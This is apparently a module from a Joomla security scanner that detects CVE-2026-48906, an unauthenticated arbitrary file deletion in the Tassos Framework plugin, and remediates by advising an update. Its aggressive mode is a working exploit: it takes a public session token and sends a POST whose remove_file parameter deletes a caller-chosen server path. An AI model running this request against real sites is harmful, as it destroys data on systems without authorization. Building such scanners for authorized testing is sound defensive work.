from __future__ import annotations

import json
import re
from typing import Any

from ...core.http import HttpClient, form_encode, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from ...core.versions import parse_version_safe

CVE_ID = "CVE-2026-48906"
NAME = "Tassos Framework unauthenticated arbitrary file deletion"
COMPONENT = "Tassos Framework (plg_system_nrframework)"
AFFECTED_RULE = "Tassos Framework 1.0.0 through 6.0.x; fixed in 6.1.0"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["safe", "aggressive"]
DELETE_PATH = (
    "/index.php?option=com_ajax&format=raw&plugin=nrframework"
    "&path=plugins/system/nrframework/fields/"
    "&class=JFormFieldNRInlineFileUpload&file=nrinlinefileupload&task=Include"
)
TOKEN_RE = re.compile(r'name="([a-f0-9]{32})" value="1"')


def _numeric_version(version: str | None) -> str | None:
    match = re.match(r"\s*(\d+(?:\.\d+)+)", str(version or ""))
    return match.group(1) if match else None


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(_numeric_version(version))
    fixed = parse_version_safe("6.1.0")
    if parsed is None or fixed is None:
        return "DETECTED_VERSION_UNKNOWN"
    return "LIKELY_VULNERABLE" if parsed < fixed else "NOT_AFFECTED"


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    info = (plugins or {}).get("nrframework", {})
    if not info.get("found"):
        return Finding(cve=CVE_ID, name=NAME, status="NOT_DETECTED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, detail="The Tassos Framework plugin was not detected.", action="No action is required unless a Tassos extension is installed but hidden from public detection.")
    version = info.get("version")
    status = classify_version(version)
    if status == "LIKELY_VULNERABLE":
        detail = f"Detected Tassos Framework {version}, within the affected range below 6.1.0. The inline file upload remove action deletes the request-supplied path."
        action = "Update any Tassos extension to pull in Tassos Framework 6.1.0 or newer, then remove leftover framework copies."
        confidence = "HIGH"
    elif status == "NOT_AFFECTED":
        detail = f"Detected Tassos Framework {version}, which no longer exposes the vulnerable inline file upload remove handler."
        action = "No action is required for this CVE if version detection is accurate."
        confidence = "HIGH"
    else:
        detail = "The Tassos Framework plugin was detected, but its version could not be determined."
        action = "Determine the installed Tassos Framework version and update to 6.1.0 or newer."
        confidence = "MEDIUM"
    return Finding(cve=CVE_ID, name=NAME, status=status, confidence=confidence, component=COMPONENT, component_version=version, affected_rule=AFFECTED_RULE, exploit_available=True, detail=detail, action=action)


def _session_token(client: HttpClient, base: str, timeout: int) -> str | None:
    for path in ("/index.php", "/index.php?option=com_users&view=login"):
        response = client.get(f"{base}{path}", timeout=timeout)
        if is_transport_error(response):
            continue
        match = TOKEN_RE.search(response.get("body") or "")
        if match:
            return match.group(1)
    return None


def run_aggressive_probe(
    target_url: str,
    target_file: str = "/var/www/html/proofcms-delete-canary.txt",
    canary_url: str | None = None,
    timeout: int = 12,
    proxy: str | None = None,
) -> Finding:
    """Delete a seeded canary through the inline file upload remove action.

    ``JFormFieldNRInlineFileUpload::onRemove()`` in the 6.0.x framework calls
    ``unlink($options->get('remove_file'))`` without checking that the path is
    inside the upload folder. 6.1.0 removes the obsolete handler. The probe
    requests the public canary first, deletes it with an unauthenticated
    session token, then checks that it is gone.
    """
    base = normalize_url(target_url)
    client = HttpClient(timeout=timeout, proxy=proxy)
    canary = canary_url or f"{base}/proofcms-delete-canary.txt"
    before = client.get(canary, timeout=timeout)
    before_status = 0 if is_transport_error(before) else before.get("status", 0)
    token = _session_token(client, base, timeout)
    if not token:
        return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=False, proof_url=f"{base}{DELETE_PATH}", detail="No public Joomla session token was available, so the delete request was not sent.", action="Verify the frontend login/session token handling on an authorized staging site.")

    response = client.request(
        f"{base}{DELETE_PATH}",
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded", "X-CSRF-Token": token},
        data=form_encode({"action": "remove", "remove_file": target_file, token: "1"}),
        timeout=timeout,
    )
    if is_transport_error(response):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{base}{DELETE_PATH}", detail=f"The delete request failed in transit ({transport_error_detail(response)}).", action="Retry when the target is reachable.")

    body = response.get("body") or ""
    deleted_json = False
    try:
        payload = json.loads(body)
        deleted_json = payload.get("error") is False
    except ValueError:
        pass
    after = client.get(canary, timeout=timeout)
    after_status = 0 if is_transport_error(after) else after.get("status", 0)
    gone = before_status == 200 and after_status == 404
    evidence = {
        "token_found": True,
        "target_file": target_file,
        "canary_url": canary,
        "canary_status_before": before_status,
        "canary_status_after": after_status,
        "delete_status": response.get("status"),
        "delete_response": body[:120],
        "deleted_json": deleted_json,
        "canary_gone": gone,
    }
    if deleted_json or gone:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE",
            confidence="CONFIRMED",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=f"{base}{DELETE_PATH}",
            evidence=evidence,
            detail=(
                "An unauthenticated session token was enough to reach the inline file upload remove action and delete "
                "the request-supplied path. The probe removed only the seeded proofcms-delete-canary.txt file."
            ),
            action="Update every Tassos extension to pull in Tassos Framework 6.1.0 or newer and remove leftover framework copies.",
        )
    status = "BLOCKED_EXTERNAL" if response.get("status") in (401, 403) else "NOT_CONFIRMED"
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status=status,
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=True,
        exploit_ran=True,
        proof_url=f"{base}{DELETE_PATH}",
        evidence=evidence,
        detail=(
            f"The delete action returned HTTP {response.get('status')} and the canary "
            f"{'survived' if after_status == 200 else 'was not readable'} (before={before_status}, after={after_status}); "
            "6.1.0 removes the obsolete handler."
        ),
        action="Update affected Tassos extensions even when the external proof is inconclusive.",
    )


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    url = f"{base}/index.php"
    response = HttpClient(timeout=timeout, proxy=proxy).get(url, timeout=timeout)
    if is_transport_error(response):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail=f"The site could not be reached ({transport_error_detail(response)}).", action="Retry when the target is reachable.")
    return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail="The site is reachable; the delete payload was not sent in safe mode.", action="Use aggressive mode with a seeded canary on an authorized staging site.")


def check(target_url: str, joomla_version: str | None = None, run_exploit_check: bool = False, timeout: int = 12, proxy: str | None = None, exploit_mode: str = "safe", plugins: dict[str, Any] | None = None, aggressive_command: str | None = None, aggressive_args: dict[str, Any] | None = None, **kwargs: Any) -> Finding:
    from ...core.args import aggressive_value

    passive = passive_result(plugins)
    if not run_exploit_check:
        return passive
    if exploit_mode == "aggressive":
        if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
            passive.detail += " Aggressive proof skipped because the Tassos Framework was not detected as potentially affected."
            return passive
        result = run_aggressive_probe(
            target_url,
            target_file=aggressive_value(aggressive_args, aggressive_command, "target_file") or "/var/www/html/proofcms-delete-canary.txt",
            canary_url=aggressive_value(aggressive_args, aggressive_command, "canary_url"),
            timeout=timeout,
            proxy=proxy,
        )
        result.component_version = passive.component_version
        return result
    if exploit_mode != "safe":
        passive.detail += " This module supports safe (site reachability) and aggressive (inline upload delete) modes."
        return passive
    if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        return passive
    result = run_safe_probe(target_url, timeout, proxy)
    result.component_version = passive.component_version
    return result


def cleanup(
    target_url: str,
    *,
    timeout: int = 12,
    proxy: str | None = None,
    aggressive_args: dict | None = None,
    aggressive_command: str | None = None,
) -> dict:
    """Verify the uploaded artifact and report any manual removal step."""
    from ...core.cleanup import cleanup_http_artifact

    return cleanup_http_artifact(
        target_url,
        timeout=timeout,
        proxy=proxy,
        aggressive_args=aggressive_args,
        aggressive_command=aggressive_command,
    )


def metadata() -> dict[str, Any]:
    return {"cve": CVE_ID, "cms": "joomla", "name": NAME, "component": COMPONENT, "affected_rule": AFFECTED_RULE, "affected_joomla_versions": ["*"], "exploit_available": True, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE, "vulnerability_type": "Arbitrary File Deletion", "module_version": "1.0.0", "last_reviewed": "2026-11-17", "updated": "2026-11-17", "required_detectors": ["nrframework"], "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-48906", "https://www.tassos.gr/blog/company/security-update-arbitrary-file-deletion-vulnerability-fixed", "https://mysites.guru/vulnerabilities/CVE-2026-48906"]}
